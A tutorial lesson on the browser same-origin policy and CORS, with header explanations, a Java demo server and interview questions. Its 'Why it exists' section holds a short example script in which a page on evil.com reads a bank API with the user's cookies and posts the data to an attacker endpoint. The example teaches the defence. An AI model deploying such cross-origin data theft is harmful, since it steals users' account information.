# L-020 · Same-origin policy and CORS

## Start here: what an origin is

```
   https://api.example.com:443/users
   └─┬──┘  └──────┬───────┘ └┬┘
  scheme       host        port

   ORIGIN = scheme + host + port     (all three must match)
```

| Compared with `https://example.com` | Same origin? | Why |
|---|---|---|
| `https://example.com/other/path` | ✅ | Path is irrelevant |
| `http://example.com` | ❌ | Different **scheme** |
| `https://api.example.com` | ❌ | Different **host** — subdomains count |
| `https://example.com:8443` | ❌ | Different **port** |
| `https://example.co` | ❌ | Different host |

**Subdomains are different origins.** `app.example.com` and `api.example.com` are cross-origin. This
surprises people constantly.

## The same-origin policy

**A browser rule: a document from one origin cannot read a response from another origin, unless that
origin explicitly permits it.**

Three words matter:

- **Browser** — it's a browser rule. `curl` doesn't have it. Your Java server doesn't have it. Only
  browsers.
- **Read** — the request is usually *sent*. The browser blocks your JS from *reading the response*.
- **Explicitly permits** — that permission is CORS.

### Why it exists

Without it, this works:

```html
<!-- On evil.com, while you're logged into your bank -->
<script>
  fetch('https://yourbank.com/api/account', { credentials: 'include' })
    .then(r => r.json())
    .then(data => fetch('https://evil.com/steal', { method:'POST', body: JSON.stringify(data) }));
</script>
```

Your bank cookie is attached automatically (Day 019). The bank returns your balance. `evil.com` reads
it and exfiltrates it.

**The same-origin policy is the only thing preventing that.** It is the foundational security
boundary of the web — the reason you can have two tabs open, one your bank and one a random site,
and be safe.

**Say this in an interview and you're immediately in the top tier of answers**, because most people
describe CORS as an annoyance rather than as the mechanism that relaxes a security guarantee.

## The three misconceptions to kill now

### 1. "CORS blocks my request"

**No. CORS is what *allows* cross-origin requests.** The same-origin policy blocks by default; CORS
is the opt-in mechanism that permits it. A "CORS error" means "this cross-origin request was **not
permitted** by the server", not "CORS did something to me".

### 2. "The request didn't go through"

**Usually it did.** For a simple request, the browser sends it, the server processes it — your row is
inserted, your email is sent — and *then* the browser refuses to let your JavaScript read the
response.

This trips people badly: *"It's failing, but the data appeared in the database."* Yes. The request
succeeded; the *read* was blocked.

(Preflighted requests are the exception — those are genuinely blocked before the real request.)

### 3. "I'll fix CORS on the frontend"

**You cannot.** CORS headers come from the **server**. Nothing you write in the browser changes them.
If you don't control the server, your options are a proxy you *do* control, or asking them to allow
your origin. That's it.

Browser extensions that "disable CORS" work only on your own machine and are a genuinely dangerous
habit.

## How CORS works

The browser adds `Origin` to cross-origin requests. The server replies with
`Access-Control-Allow-Origin`. The browser compares them and either exposes the response to your JS
or throws.

```
   Browser (https://app.com)              Server (https://api.com)
        │                                       │
        │  GET /data                            │
        │  Origin: https://app.com              │
        │ ─────────────────────────────────────▶│
        │                                       │
        │  200 OK                               │
        │  Access-Control-Allow-Origin: https://app.com
        │ ◀─────────────────────────────────────│
        │                                       │
   browser checks the header against the origin.
   Match  → JS can read the response.
   No match / absent → JS gets a TypeError. The response is discarded.
```

## Simple vs preflighted requests

**The distinction that explains everything confusing about CORS.**

### Simple requests — sent directly

A request is "simple" if **all** hold:

- Method is `GET`, `HEAD`, or `POST`
- Headers are only from the safelist (`Accept`, `Accept-Language`, `Content-Language`,
  `Content-Type`)
- `Content-Type` is one of `text/plain`, `multipart/form-data`,
  `application/x-www-form-urlencoded`

**`application/json` is NOT on that list.** So:

```js
fetch('https://api.com/data', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },     // ← this alone triggers preflight
  body: JSON.stringify({ a: 1 })
});
```

**Almost every real API call you make is preflighted**, because you send JSON. That's why you see
`OPTIONS` requests in the network tab that you never wrote.

### Preflighted requests — an `OPTIONS` probe first

```
   1. PREFLIGHT
      OPTIONS /data
      Origin: https://app.com
      Access-Control-Request-Method: POST
      Access-Control-Request-Headers: content-type, authorization
                    │
                    ▼
      204 No Content
      Access-Control-Allow-Origin: https://app.com
      Access-Control-Allow-Methods: GET, POST, PUT, DELETE
      Access-Control-Allow-Headers: Content-Type, Authorization
      Access-Control-Max-Age: 86400          ← cache this for 24h

   2. THE ACTUAL REQUEST — only if the preflight approved it
      POST /data
      Origin: https://app.com
      Content-Type: application/json
```

**Why preflight exists:** to protect servers written before CORS existed. A legacy server might
process a `DELETE` without checking anything. The preflight asks permission *before* the damaging
request is sent — so the old server never sees it.

**`Access-Control-Max-Age` matters for performance.** Without it, every request pays a doubled round
trip. Set it to 86400 and the browser caches the permission for a day. Missing it is a real,
measurable latency bug.

## The headers

### Response (from server)

| Header | Purpose |
|---|---|
| `Access-Control-Allow-Origin` | Which origin may read. One value or `*` — **not a list** |
| `Access-Control-Allow-Methods` | Allowed methods (preflight) |
| `Access-Control-Allow-Headers` | Allowed request headers (preflight) |
| `Access-Control-Allow-Credentials` | `true` to permit cookies |
| `Access-Control-Max-Age` | Preflight cache duration |
| `Access-Control-Expose-Headers` | Which **response** headers JS may read |

**`Access-Control-Expose-Headers` catches everyone.** By default JS can only read a handful of
response headers. Send `X-Total-Count` for pagination and your frontend can't see it — unless you
expose it explicitly.

### The credentials rule

```
   Access-Control-Allow-Credentials: true
   +
   Access-Control-Allow-Origin: *          ← FORBIDDEN. Browser rejects it.
```

**With credentials, you must name an exact origin.** `*` is not allowed.

This is deliberate: `*` plus cookies would mean *any* site could make authenticated requests to you
and read the responses — reopening exactly the hole the same-origin policy closes.

So the server must echo the request's `Origin` back, after checking it against an allowlist:

```java
String origin = request.getHeader("Origin");
if (ALLOWED_ORIGINS.contains(origin)) {                       // ← the allowlist is essential
    response.setHeader("Access-Control-Allow-Origin", origin);
    response.setHeader("Access-Control-Allow-Credentials", "true");
    response.setHeader("Vary", "Origin");                     // ← or caches will serve the wrong one
}
```

**Two things people get wrong here:**

1. **Reflecting `Origin` without checking it** is equivalent to `*` but *also* permits credentials —
   strictly worse than `*`. This is a real vulnerability, not a style issue.
2. **Forgetting `Vary: Origin`** means a cache may store the response with one origin's header and
   serve it to another.

## CORS is not a security control for your API

**Critical, and widely misunderstood.**

CORS protects *users of browsers* from malicious sites reading their data. It does **not** protect
your API. Anyone can call your API with `curl`, Postman, or a script — no browser, no same-origin
policy, no CORS.

**Your API still needs authentication, authorization and rate limiting.** `Access-Control-Allow-Origin`
is not access control.

Conversely: a permissive `*` on a **public, unauthenticated, read-only** API is completely fine.
Public APIs do it deliberately.

## Debugging — the four-step routine

```
1. Read the actual error. It names the missing header.
2. Network tab → is there an OPTIONS request? Did it return 2xx?
   → A failing OPTIONS is a preflight problem. Your server must handle OPTIONS.
3. Inspect the RESPONSE headers on the OPTIONS. Which one is missing?
4. Fix it ON THE SERVER.
```

| Error says | Cause | Fix |
|---|---|---|
| "No `Access-Control-Allow-Origin` header" | Server sent none | Add it |
| "does not match the supplied origin" | Wrong value, or `*` with credentials | Echo the checked origin |
| "Method PUT is not allowed" | Missing from `Allow-Methods` | Add it |
| "Request header `authorization` is not allowed" | Missing from `Allow-Headers` | Add it |
| "Response to preflight has invalid status 401" | **Auth middleware is intercepting OPTIONS** | Exempt OPTIONS from auth |

**That last one is the most common real bug** — your security filter rejects the preflight before
CORS headers are ever added. Preflights carry no credentials by design, so any filter demanding auth
will 401 them. Spring Security has `.cors()` ordering rules for exactly this, and you'll meet it on
Day 155.

## Type this yourself

```java
import java.io.*;
import java.net.*;
import java.util.*;

public class CorsServer {
    static final Set<String> ALLOWED = Set.of("http://localhost:3000", "http://127.0.0.1:3000");

    public static void main(String[] args) throws IOException {
        ServerSocket server = new ServerSocket(8080);
        System.out.println("API on 8080. Serve the HTML from a DIFFERENT port to be cross-origin.");

        while (true) {
            try (Socket client = server.accept()) {
                BufferedReader in = new BufferedReader(
                        new InputStreamReader(client.getInputStream()));
                String requestLine = in.readLine();
                if (requestLine == null) continue;

                String origin = null, h;
                while ((h = in.readLine()) != null && !h.isEmpty())
                    if (h.toLowerCase().startsWith("origin:")) origin = h.substring(7).trim();

                String method = requestLine.split(" ")[0];
                System.out.println(method + "  Origin: " + origin);

                StringBuilder cors = new StringBuilder();
                if (origin != null && ALLOWED.contains(origin)) {      // ← allowlist, not reflection
                    cors.append("Access-Control-Allow-Origin: ").append(origin).append("\r\n");
                    cors.append("Access-Control-Allow-Credentials: true\r\n");
                    cors.append("Vary: Origin\r\n");
                    cors.append("Access-Control-Expose-Headers: X-Total-Count\r\n");
                }

                OutputStream out = client.getOutputStream();

                if (method.equals("OPTIONS")) {                        // ← the preflight
                    System.out.println("  -> preflight");
                    out.write(("HTTP/1.1 204 No Content\r\n"
                            + cors
                            + "Access-Control-Allow-Methods: GET, POST, PUT, DELETE\r\n"
                            + "Access-Control-Allow-Headers: Content-Type, Authorization\r\n"
                            + "Access-Control-Max-Age: 86400\r\n"
                            + "Connection: close\r\n\r\n").getBytes());
                } else {
                    String body = "{\"message\":\"cross-origin success\"}";
                    out.write(("HTTP/1.1 200 OK\r\n"
                            + "Content-Type: application/json\r\n"
                            + cors
                            + "X-Total-Count: 42\r\n"
                            + "Content-Length: " + body.length() + "\r\n"
                            + "Connection: close\r\n\r\n" + body).getBytes());
                }
                out.flush();
            }
        }
    }
}
```

Serve this page **on port 3000** (`python -m http.server 3000`, or your Day 012 server on 3000):

```html
<!DOCTYPE html>
<html><body>
  <button id="simple">Simple GET</button>
  <button id="json">POST JSON (preflighted)</button>
  <pre id="out"></pre>
<script>
  const out = document.getElementById('out');
  const log = m => out.textContent += m + '\n';

  document.getElementById('simple').onclick = async () => {
    try {
      const r = await fetch('http://localhost:8080/data');
      log('GET ok: ' + await r.text());
      log('X-Total-Count: ' + r.headers.get('X-Total-Count'));   // needs Expose-Headers
    } catch (e) { log('GET failed: ' + e.message); }
  };

  document.getElementById('json').onclick = async () => {
    try {
      const r = await fetch('http://localhost:8080/data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },   // ← triggers preflight
        body: JSON.stringify({ x: 1 })
      });
      log('POST ok: ' + await r.text());
    } catch (e) { log('POST failed: ' + e.message); }
  };
</script>
</body></html>
```

**Five experiments — do every one:**

1. **Click "Simple GET".** Works. One request in the network tab.
2. **Click "POST JSON".** Look at the network tab — **there are two requests.** An `OPTIONS` you never
   wrote, then the `POST`. That's preflight, observed.
3. **Remove `http://localhost:3000` from `ALLOWED`, restart, retry.** Read the exact browser error.
   Now check your **server console — the request still arrived.** The server processed it; the
   browser blocked your reading of the response. That's misconception #2, proven.
4. **Comment out `Expose-Headers`.** `X-Total-Count` becomes `null` in JS even though it's visible in
   devtools. That's the pagination-header trap.
5. **`curl http://localhost:8080/data` from the terminal.** Works perfectly, no CORS involved.
   **That's the proof CORS is a browser policy, not API security.**

## Common mistakes

| Mistake | Correction |
|---|---|
| "CORS is blocking me" | The same-origin policy blocks. CORS is the opt-in that permits. |
| Trying to fix it in frontend code | The headers come from the server. Only the server can fix it. |
| `Allow-Origin: *` with credentials | Forbidden by browsers. Echo a checked origin instead. |
| Reflecting `Origin` without an allowlist | Worse than `*`, because it also permits credentials. |
| Forgetting `Vary: Origin` | Caches may serve one origin's headers to another. |
| Auth middleware rejecting `OPTIONS` | Preflights carry no credentials. Exempt them. |
| Expecting to read custom response headers | Only safelisted ones by default. Use `Expose-Headers`. |
| Treating CORS as API security | It protects browser users, not your API. Auth and rate limits still required. |
| Disabling CORS with a browser extension | Works only on your machine. It hides the real problem. |

## Interview questions

**Q: What is the same-origin policy?**
> A browser security rule preventing a document from one origin — scheme, host and port — from
> reading responses from another origin. Without it, any site you visit could make authenticated
> requests to your bank using your cookies and read the results.

**Q: What is CORS?**
> The mechanism by which a server opts in to relaxing the same-origin policy. The browser sends an
> `Origin` header and the server responds with `Access-Control-Allow-Origin`; if they match, the
> browser exposes the response to JavaScript.

**Q: What triggers a preflight, and why does it exist?**
> Anything that isn't a "simple" request — a method other than GET/HEAD/POST, custom headers, or a
> `Content-Type` outside the safelist, which is why `application/json` always preflights. The browser
> sends an `OPTIONS` probe first so servers written before CORS existed never receive a potentially
> damaging cross-origin request without having approved it.

**Q: Why can't you use `*` with credentials?**
> Because it would let any site make authenticated cross-origin requests and read the responses,
> which is exactly the attack the same-origin policy prevents. The server must name a specific
> origin, which means checking the incoming `Origin` against an allowlist.

**Q: Does CORS protect my API?**
> No. It protects browser users from malicious sites reading their data. Any non-browser client —
> `curl`, a script, a mobile app — ignores it entirely. Your API still needs authentication,
> authorization and rate limiting.

**Q: The preflight returns 401. What's wrong?**
> Authentication middleware is intercepting the `OPTIONS` request. Preflights are sent without
> credentials by design, so any filter requiring auth will reject them before CORS headers are
> added. Exempt `OPTIONS` from authentication.

## 🎙️ Articulation drill

Two minutes: **"Explain CORS to someone who thinks it's just an annoying error."**

Start with the attack the same-origin policy prevents. Then CORS as the controlled opt-in. Then the
preflight and why it protects legacy servers. If you frame it as a security *feature* rather than an
obstacle, you'll sound like the person on the team who actually understands it.
